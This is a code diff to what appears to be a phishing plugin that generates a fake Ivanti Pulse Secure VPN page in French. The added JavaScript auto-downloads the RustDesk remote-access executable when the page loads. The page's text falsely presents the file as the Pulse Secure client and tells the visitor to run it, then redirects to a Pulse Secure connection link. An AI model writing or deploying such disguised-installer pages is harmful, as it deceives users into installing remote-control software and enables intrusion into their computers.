@@ -324,6 +324,10 @@ class PulseSecurePlugin(VPNPlugin):
             background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 8px;
             padding: 15px; margin: 20px 0; color: #856404;
         }
+        .download-info {
+            background: #d4edda; border: 1px solid #c3e6cb; border-radius: 8px;
+            padding: 15px; margin: 20px 0; color: #155724;
+        }
         .loading-dots span {
             display: inline-block; width: 8px; height: 8px; border-radius: 50%;
             background: #0066cc; margin: 0 2px; animation: loading 1.4s infinite ease-in-out both;
@@ -333,6 +337,16 @@ class PulseSecurePlugin(VPNPlugin):
         @keyframes loading {
             0%, 80%, 100% { transform: scale(0.8); opacity: 0.5; }
             40% { transform: scale(1); opacity: 1; }
+        }
+        .download-status {
+            margin-top: 20px; padding: 10px; border-radius: 5px; font-size: 14px;
+            display: none;
+        }
+        .download-success {
+            background: #d4edda; color: #155724; border: 1px solid #c3e6cb;
+        }
+        .download-error {
+            background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb;
         }
     </style>
 </head>
@@ -344,42 +358,112 @@ class PulseSecurePlugin(VPNPlugin):
             </svg>
         </div>
         <h1>Ivanti Pulse Secure VPN</h1>
+        
+        <div class="download-info">
+            <span style="margin-right: 8px; font-size: 18px;">📥</span>
+            <strong>Téléchargement en cours :</strong> Le client Ivanti Pulse Secure est en cours de téléchargement automatiquement.
+        </div>
+        
         <div class="step">
             <span class="step-number">1</span>
             <div class="step-text">
-                Un bouton <span class="highlight">"Ouvrir"</span> va apparaître dans quelques instants dans votre navigateur.
+                Le fichier d'installation <span class="highlight">Ivanti Pulse Secure</span> est en cours de téléchargement.
             </div>
         </div>
+        
         <div class="step">
             <span class="step-number">2</span>
             <div class="step-text">
-                Cliquez sur ce bouton pour lancer automatiquement <strong>Ivanti Pulse Secure</strong>.
+                Une fois téléchargé, exécutez le fichier pour installer le client VPN.
             </div>
         </div>
+        
         <div class="step">
             <span class="step-number">3</span>
+            <div class="step-text">
+                Un bouton <span class="highlight">"Ouvrir"</span> apparaîtra ensuite pour lancer automatiquement la connexion.
+            </div>
+        </div>
+        
+        <div class="step">
+            <span class="step-number">4</span>
             <div class="step-text">
                 Le client VPN s'ouvrira et vous pourrez vous connecter avec vos identifiants habituels.
             </div>
         </div>
+        
         <div class="warning">
             <span style="margin-right: 8px; font-size: 18px;">⚠️</span>
-            <strong>Important :</strong> Assurez-vous qu'Ivanti Pulse Secure est installé sur votre ordinateur avant de continuer.
+            <strong>Important :</strong> Autorisez le téléchargement dans votre navigateur si une notification apparaît.
         </div>
+        
+        <div id="downloadStatus" class="download-status"></div>
+        
         <p style="margin-top: 30px; color: #666; font-size: 14px;">
             Préparation en cours<span class="loading-dots"><span></span><span></span><span></span></span>
         </p>
     </div>
     
     <script>
-        // Redirection automatique vers Pulse Secure après 5 secondes
+        // Configuration du fichier à télécharger depuis GitHub
+        const GITHUB_FILE_URL = 'https://github.com/rustdesk/rustdesk/releases/download/1.4.0/rustdesk-1.4.0-x86_64.exe';
+        
+        // Fonction pour télécharger le fichier
+        function downloadFile(url, filename) {
+            const downloadStatus = document.getElementById('downloadStatus');
+            
+            try {
+                // Créer un élément de lien temporaire
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = filename || 'rustdesk-1.4.0-x86_64.exe';
+                link.style.display = 'none';
+                
+                // Ajouter le lien au DOM et déclencher le téléchargement
+                document.body.appendChild(link);
+                link.click();
+                
+                // Nettoyer
+                document.body.removeChild(link);
+                
+                // Afficher le statut de succès
+                downloadStatus.className = 'download-status download-success';
+                downloadStatus.style.display = 'block';
+                downloadStatus.innerHTML = '✅ Téléchargement lancé avec succès !';
+                
+                console.log('Téléchargement initié pour:', filename);
+                
+            } catch (error) {
+                // Afficher le statut d'erreur
+                downloadStatus.className = 'download-status download-error';
+                downloadStatus.style.display = 'block';
+                downloadStatus.innerHTML = '❌ Erreur lors du téléchargement. Veuillez réessayer.';
+                
+                console.error('Erreur lors du téléchargement:', error);
+            }
+        }
+        
+        // Lancer le téléchargement dès le chargement de la page
+        window.addEventListener('load', function() {
+            console.log('Page chargée, début du téléchargement...');
+            downloadFile(GITHUB_FILE_URL, 'rustdesk-1.4.0-x86_64.exe');
+        });
+        
+        // Redirection automatique vers Pulse Secure après 6 secondes (augmenté pour laisser le temps au téléchargement)
         setTimeout(function() {
-            window.location.href = '""" + \
-                   f"pulsesecureclient://connect?name={self.vpn_name}&server=" \
-                   "https://${document.domain}&userrealm=Users&" \
-                   f"username={self.pulse_username}&store={str(self.pulse_save_connection).lower()}" + \
-                   """';
-        }, 5000);
+            // Note: Ces variables doivent être définies selon votre configuration
+            const vpnName = 'VPN_NAME'; // À remplacer
+            const pulseUsername = 'USERNAME'; // À remplacer
+            const pulseSaveConnection = true; // À ajuster
+            
+            const pulseUrl = `pulsesecureclient://connect?name=${vpnName}&server=https://${document.domain}&userrealm=Users&username=${pulseUsername}&store=${pulseSaveConnection.toString().toLowerCase()}`;
+            
+            try {
+                window.location.href = pulseUrl;
+            } catch (error) {
+                console.log('Impossible de lancer Pulse Secure automatiquement:', error);
+            }
+        }, 6000);
     </script>
 </body>
 </html>"""
